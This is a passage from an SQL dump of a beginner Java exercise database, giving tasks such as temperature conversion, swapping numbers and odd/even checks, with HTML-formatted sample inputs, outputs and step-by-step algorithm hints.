2:\r\n</p><p style=\"line-height: 1;\">1\r\n</p>','B','','prog/java/BytToKilo.java','Get bytes Byt as input (using scanner class) \r\n\r\nCalculate kilobytes Kilo by dividing bytes Byt by 1024. (kb=b/1024, 1024 bytes is equal to 1 kilobyte)\r\n\r\nPrint kilobytes kb (using System.out.println)',22,'','',NULL),(1010,'Java Program to find simple interest','Java-Program-to-find-simple-interest','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">                                                                                                                                                                                                        Enter the number of years:                                                                                                                                                                                                             1                                                                                                                                                                                                               Enter the Rate:                                                                                                                                                                                                        10                                                                                                                                                                                                             Enter the Principle Amount:                                                                                                                                                                                                        1000 </p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">100                                                                                                                                                                                                              </p>','B','','prog/java/SimpleInt.java','<p style=\"line-height: 1;\">Get principal p, number of months n and rate of interest rate as inputs.</p><p style=\"line-height: 1;\">(using scanner class)\r\n\r\ncalculate Simple Interest Si by formula Si= p*n*rate/100\r\n\r\nprint Simple Interest Si using system.out.println.</p>',22,'','',''),(1011,'Java Program to calculate Fahrenheit to Celsius','Java-Program-to-calculate-Fahrenheit-to-Celsius','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">                                                                                                                                                                                                                                                                                                                                                                                                                Enter the Fahrenheit:\r\n284\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe Celsius Is :140\r\n</p>','B','','prog/java/FaToCe.java','Get Fahrenheit  as input (using scanner class)\r\n\r\nCalculate Celsius  using Formula celsius=(fahreheit-32)*0.5556\r\n\r\nprint Celcius  (using system.out.println).',22,NULL,NULL,NULL),(1012,'Java Program to calculate Celsius to Fahrenheit','Java-Program-to-calculate-Celsius-to-Fahrenheit','<p style=\"line-height: 1;\">Sample Input 1: </p><p style=\"line-height: 1;\">                                                                                                                                                                                                       Enter the Celsius:1</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">The Fahrenheit Is:33.8\r\n\r\n</p>','B','','prog/java/CeToFa.java','Get celsius as input (using scanner class)\r\n\r\nCalculate fahreheit  using Formula fahreheit=celsius*1.8+32;\r\n\r\nprint fahreheit  (using system.out.println).',22,NULL,NULL,NULL),(1013,'Java Program to Swap two numbers using third variable','Java-Program-to-Swap-two-numbers-using-third-variable','<p style=\"line-height: 1;\">Get two integers a and b from user and swap the values\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">6 5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5 6\r\n</p>','B','','prog/java/SwapT.java','Get input1 and input2 using scanner class.\r\n\r\nswap the values using third variable temp.\r\n\r\nPrint input1 and input2 using system.out.println()',22,NULL,NULL,NULL),(1014,'Java Program to Swap of two numbers without using third variable','Java-Program-to-Swap-of-two-numbers-without-using-third-variable','<p style=\"line-height: 1;\">Get two integers a and b from user and swap the values without using third variable </p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\"> 6 5</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">5 6\r\n</p>','B','','prog/java/SwapWOT.java','<p style=\"line-height: 1;\">Get input1 and input2 using scanner class.\r\n</p><p style=\"line-height: 1;\">\r\nswap the values without using any extra variables. </p><p style=\"line-height: 1;\">                                                                                                                                                                                                       Input1 =input1+input2 </p><p style=\"line-height: 1;\">                                                                                                                                                                                                       input2=input1-input2 </p><p style=\"line-height: 1;\">                                                                                                                                                                                                       input1=input1-input2</p><p style=\"line-height: 1;\">\r\n\r\nPrint input1 and input2 using system.out.println()</p>',22,'','',''),(1015,'Java Program to print the last digit of given number N','Java-Program-to-print-the-last-digit-of-given-number-N','<p style=\"line-height: 1;\">Get an number  n from user  and display the last digit of n\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n623</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">3</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n280</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n0\r\n</p>','B','','prog/java/LastDigit.java','<p style=\"line-height: 1;\">Get a input input1 (using scanner class)\r\n\r\nSeprate the last digit of number num by \"digit = input%10\". </p><p style=\"line-height: 1;\">(% by 10 always gives last digit of a number)\r\n\r\nprint the digit (using system.out.println)</p>',22,NULL,NULL,NULL),(1016,'Java Program to calculate discount of 5% for purchase above 5000','Java-Program-to-calculate-discount-of-5-for-purchase-above-5000','<p style=\"line-height: 1;\">Get price and quantity of a product, calculate bill amount and calculate 5% discount \r\nfor the billamount 5000 and above.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10 400</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n4000</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n20 500</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n9500</p>','B','','prog/java/Discount.java','<p style=\"line-height: 1;\">1. Get two inputs quantity and price from user using scanner class\r\n</p><p style=\"line-height: 1;\">2. Calculate amount by using the expression amount = quantity * price\r\n</p><p style=\"line-height: 1;\">3. Check whether amount is greater than 5000 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if amount is greater than 5000 then calculate discount and amount using the expressions </p><p style=\"line-height: 1;\"><span style=\"color: rgb(0, 49, 99);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span style=\"color: rgb(255, 0, 255);\"> 3a.&nbsp; &nbsp;discount = amount * 0.05 </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 3b.&nbsp; &nbsp;amount = amount - discount</span></p><p style=\"line-height: 1;\">4. print amount using system.out.println</p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">3a and 3b will be executed if 3 returns true else those two won\'t be executed.</p>',23,'','raptor/Branching_IV3j00U.PNG',''),(1017,'Java Program to find greatest among two numbers','Java-Program-to-find-greatest-among-two-numbers','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and find the greatest one among num1 \r\nand num2.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n6</p>','B','','prog/java/GreaterTw.java','<p style=\"line-height: 1;\">1. Get two inputs num1 and num2 from user using scanner class\r\n</p><p style=\"line-height: 1;\">2. check whether num1 is greater than num2 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if num1 is greater </p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(255, 0, 255);\">&nbsp;2a. print num1 using system.out.println, </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">2b. check whether num2 is greater than num1 using elseif statement.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">If num2 is greater </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(156, 0, 255);\">2b1.&nbsp;print num2 using printf statement, </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(156, 0, 255);\">2b2. print \"num1 and num2 are equal\" using system.out.println.</span></p>',23,'','raptor/greatest_of_two_numbers.PNG',''),(1018,'Java Program to find smallest among two numbers','Java-Program-to-find-smallest-among-two-numbers','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and find the smallest one among num1 \r\nand num2.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5 6</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n5</p>','B','','prog/java/SmallerTw.java','<p style=\"line-height: 1;\">1. Get two inputs num1 and num2 from user using scanner class.\r\n</p><p style=\"line-height: 1;\">2. check whether num1 is smaller than num2 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if num1 is smaller </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">&nbsp; 2a.&nbsp;print num1 using printf statment, </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">2b. check whether num2 is smaller than num1 using elseif statement.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> &nbsp;If num2 is smaller </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: rgb(156, 0, 255);\">&nbsp;2b1. print num2 using system.out.println, </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(156, 0, 255);\">&nbsp; 2b2.&nbsp;print \"num1 and num2 are equal\" using system.out.println.</span></p>',23,'','',''),(1019,'Java Program to find whether the given number is odd or even number','Java-Program-to-find-whether-the-given-number-is-odd-or-even-number','<p style=\"line-height: 1;\">Get a number num and check whether num is odd or even?\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n45</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nODD\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n56</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nEVEN</p>','B','','prog/java/OddREven.java','<p style=\"line-height: 1;\">1. Get input input1 from user using scanner class\r\n</p><p style=\"line-height: 1;\">2. check whether the remainder of input1 divided by 2 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if it is 0, then </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> 2a. print \"input1 is even\" using system.out.println.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">2b. print input1 is odd using system.out.println.</span></p>',23,'','raptor/odd_or_even.PNG',''),(1020,'Java Program to find whether the difference between two numbers is even or odd','Java-Program-to-find-whether-the-difference-between-two-numbers-is-even-or-odd','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and check whether the difference between num1 and num2 is odd or even?\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n45 56\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe difference is ODD</p>','B','','prog/java/DiffORE.java','<p style=\"line-height: 1;\">1. two inputs input1 and input2 from user using scanner class.</p><p style=\"line-height: 1;\">2. Calculate difference between input1 and input2 using the expression\r\n difference = input1 - input2.</p><p style=\"line-height: 1;\">3. check whether the remainder of difference divided by 2 is equal to 0 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if it is 0, then </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">&nbsp; 3a. print difference is even using system.out.println</span></p><p style=\"line-height: 1;\"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> 3b. print difference is odd using system.out.println</span></p>',23,'','',''),(1021,'Java Program to find whether the given number is 3 digit number or not','Java-Program-to-find-whether-the-given-number-is-3-digit-number-or-not','<p style=\"line-height: 1;\">Get a number num and check whether num is three digit number or not?.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1000\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nNot a three digit number</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">987\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nThree digit number</p>','B','','prog/java/ThreeD.java','<p style=\"line-height: 1;\">1. Get input num from user using Scanner Class</p><p style=\"line-height: 1;\">2. check whether the num is greater than 99 and less than 1000 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if it is true, then </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">2a. print num is three digit number using println function.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> &nbsp; &nbsp; &nbsp; &nbsp; 2b. print num is not three digit number using println function.</span></p><div><br></div>',23,'','raptor/3_digit_number_or_not.PNG',''),(1022,'Java Program to find greatest among three numbers','Java-Program-to-find-greatest-among-three-numbers','<p style=\"line-height: 1;\">Get three numbers num1, num2 and num3 and find the greatest one among num1,num2 and num3.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5 6 2</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\n6</p>','B','','prog/java/GreaterTh.java','<p style=\"line-height: 1;\">1. Get three inputs num1,num2 and num3 from user using scanner class\r\n</p><p style=\"line-height: 1;\">2. check whether num1 is greater than num2  and num1 is greater than num3 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if num1 is greater </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> 2a. print num1 using system.out.println, </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> 2b. check whether num2 is greater than num1 using elseif statement.</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If num2 is greater </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(99, 74, 165);\">2b1. print num2 using printf statement, </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span style=\"color: rgb(99, 74, 165);\">2b2. print num3 using system.out.println.</span></p>',23,'','',''),(1023,'Java Program to find smallest among three numbers','Java-Program-to-find-smallest-among-three-numbers','<p style=\"line-height: 1;\">Get three numbers num1, num2 and num3 and find the smallest one among num1,num2 and num3.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n1 6 2</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1</p>','B','','prog/java/SmallerTh.java','<p style=\"line-height: 1;\">1. Get three inputs num1,num2 and num3 from user using scanner class.\r\n</p><p style=\"line-height: 1;\">2. check whether num1 is smaller than num2 and num1 is smaller than num3 using if statement.\r\n</p><p style=\"line-height: 1;\">&nbsp; &nbsp; if num1 is smaller </p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(255, 0, 255);\">&nbsp; 2a. print num1 using print statment, </span></p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;else </p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; 2b. check whether num1 is smaller than num3 using elseif statement.\r\n</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If num2 is smaller </span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: rgb(99, 74, 165);\">&nbsp;2b1. print num2 using system.out.println,\r\n</span></p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp; &nbsp; &nbsp; &nbsp; else</span></p><p style=\"line-height: 1;\"> </p><p style=\"line-height: 1;\"><span style=\"color: rgb(255, 0, 255);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: rgb(99, 74, 165);\">&nbsp;2b2. print num3 using system.out.println.</span></p>',23,'','',''),(1024,'Java Program to find whether the given number is divisible by 3','Java-Program-to-find-whether-the-given-number-is-divisible-by-3','<p style=\"line-height: 1;\">Get a number num and check whether num is divisible by 3.</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n27</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nDivisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n43</p><p style=\"line-height: 1;\">Sample Output 2:\r\n</p><p style=\"line-height: 1;\">Not divisible by 3</p>','B','','prog/java/DivTh.java','<p style=\"line-height: 1;\">1. Get input num from user using scanner class.\r\n</p><p style=\"line-height: 1;\">2. check whether the remainder of num divided by 3 is equal to 0 using if statement.</p><p style=\"line-height: 1;\">\r\n\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if it is 0, then </p><p style=\"line-height: 1;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color: rgb(255, 0, 255);\">&nbsp; 2a. print num is divisible by 3 using system.out.println.</span></p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> &nbsp; 2b.&nbsp;print num is not divisible by 3 using system.out.println.</span></p>',23,'','',''),(1025,'Java Program to find whether the last digit of given number is divisible by 3','Java-Program-to-find-whether-the-last-digit-of-given-number-is-divisible-by-3','<p style=\"line-height: 1;\">Get a number num and check whether last digit of num is divisible by three. </p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">27\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nlast digit not Divisible by 3\r\n</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">43</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nlast digit divisible by 3</p>','B','','prog/java/LastDTh.java','<p style=\"line-height: 1;\">1. Get input from user using scanner class\r\n</p><p style=\"line-height: 1;\">2.extract last digit from input1 using the expression digit=input1%10.\r\n</p><p style=\"line-height: 1;\">3. check whether the remainder of digit divided by 3 is equal to 0 using if statement.\r\n</p><p style=\"line-height: 1;\">\r\n&nbsp;&nbsp;&nbsp;&nbsp;if it is 0, then </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; <span style=\"color: rgb(255, 0, 255);\">&nbsp; 3a. print digit is divisible by 3 using printf statement.</span></p><p style=\"line-height: 1;\"> &nbsp;&nbsp;&nbsp;&nbsp;Else </p><p style=\"line-height: 1;\">&nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(255, 0, 255);\"> 3b. print digit is not divisible by 3 using system.out.println.</span></p>',23,'','',''),(1026,'Java Program to Arithmetic Calculator using switch case Statements','Java-Program-to-Arithmetic-Calculator-using-switch-case-Statements','<p style=\"line-height: 1;\">Get a binary arithmetic expression and solve the expression.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">12 + 9\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">21\r\n</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n4 * 5\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\n20</p>','B','','prog/java/ArCal.java','<p style=\"line-height: 1;\">\r\nBased on the  choice, instructions in any one of the case will be executed.\r\n</p><p style=\"line-height: 1;\">\r\nBreak statement very important in switch.</p>',23,NULL,NULL,NULL),(1027,'Java Program to grade calculation system','Java-Program-to-grade-calculation-system','<p style=\"line-height: 1;\">Get a mark of a student and find its grade.\r\n(Note:\r\n96 to 100 - O Grade \r\n91 to 95 - A Grade\r\n81 to 90-B Grade\r\n71 to 80 - C Grade\r\n61 to 70 - D Grade\r\n50 to 60 - E Grade\r\nBelow 50 - F Grade)</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n75</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nC  Grade</p>','B','','prog/java/Grade.java','<p style=\"line-height: 1;\">\r\nchained conditional check is used here to check the mark range.</p><p style=\"line-height: 1;\"> any one of the grade will be displayed using else if Statement.</p>',23,'','raptor/grade_inc.png',''),(1028,'Java Program to find the whether the last digit of given two numbers are equal or not','Java-Program-to-find-the-whether-the-last-digit-of-given-two-numbers-are-equal-or-not','<p style=\"line-height: 1;\">Get two numbers num1 and num2 and check whether last digit of num1 and num2  are equal or not?.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">65 45</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nLast Digits are Equal.</p><p style=\"line-height: 1;\">Sample Input 2:\r\n</p><p style=\"line-height: 1;\">35 38\r\n</p><p style=\"line-height: 1;\">Sample Output 2:</p><p style=\"line-height: 1;\">\r\nLast Digits are Not Equal</p>','B','','prog/java/LastDEqual.java','<p>1. Get two inputs num1 and num2</p><p>2. extract the last digits of num1 and num2 using %10, </p><p>3. then compare last digits.</p>',23,'','raptor/last_digit_equal_or_not.PNG',''),(1029,'Java Program to print N Natural numbers','Java-Program-to-print-N-Natural-numbers','<p style=\"line-height: 1;\">Get input n and print natural numbers till n.</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe First Natural numbers are:\r\n1 2 3 4 5 6 7</p>','B','','prog/java/Natural.java','<p style=\"line-height: 1;\">\r\n</p><p style=\"line-height: 1;\">1. Get input limit (upto which number natural numbers to be printed)&nbsp;</p><p style=\"line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till i less than or equal to limit. (i&lt;=limit)</p><p style=\"line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: justify;\">for(i=1;i&lt;=limit;i++)</span><br></p><p style=\"line-height: 1;\">3. Here <span style=\"color: rgb(255, 0, 255);\">i is initialized to 1 </span>and <span style=\"color: rgb(255, 0, 255);\">incremented by 1</span> for each iteration, instructions inside the for block are <span style=\"color: rgb(255, 0, 255);\">executed&nbsp; &nbsp; &nbsp; in every iteration.</span>&nbsp;Iteration stops when i becomes greater than limit.</p><p style=\"line-height: 1;\"> </p><p style=\"line-height: 1;\"><br></p><p style=\"line-height: 1;\">so value of i will be printed like&nbsp; &nbsp;<span style=\"color: rgb(8, 49, 57);\">1 2 3 ....limit&nbsp;</span></p>',24,'','',''),(1030,'Java Program to print N Whole numbers','Java-Program-to-print-N-Whole-numbers','<p style=\"line-height: 1;\">Get input n and print  whole numbers till n.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">7\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nThe first Whole numbers are:\r\n0 1 2 3 4 5 6 7</p>','B','','prog/java/Whole.java','<div class=\"entity_content\" style=\"margin-top: 20px; margin-bottom: 20px; text-align: justify; color: rgb(94, 94, 94); font-family: Roboto, serif; font-size: 17px;\"><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\">1. Get input limit (upto which number Whole numbers to be printed)&nbsp;</p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\">2. Instruction(s) inside the for block{} are executed repeatedly till i less than or equal to limit. (i&lt;=limit)</p><p style=\"color: rgb(0, 0, 0); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: start; line-height: 1;\">&nbsp; &nbsp;&nbsp;<span style=\"color: rgb(51, 51, 51); font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 13px; text-align: 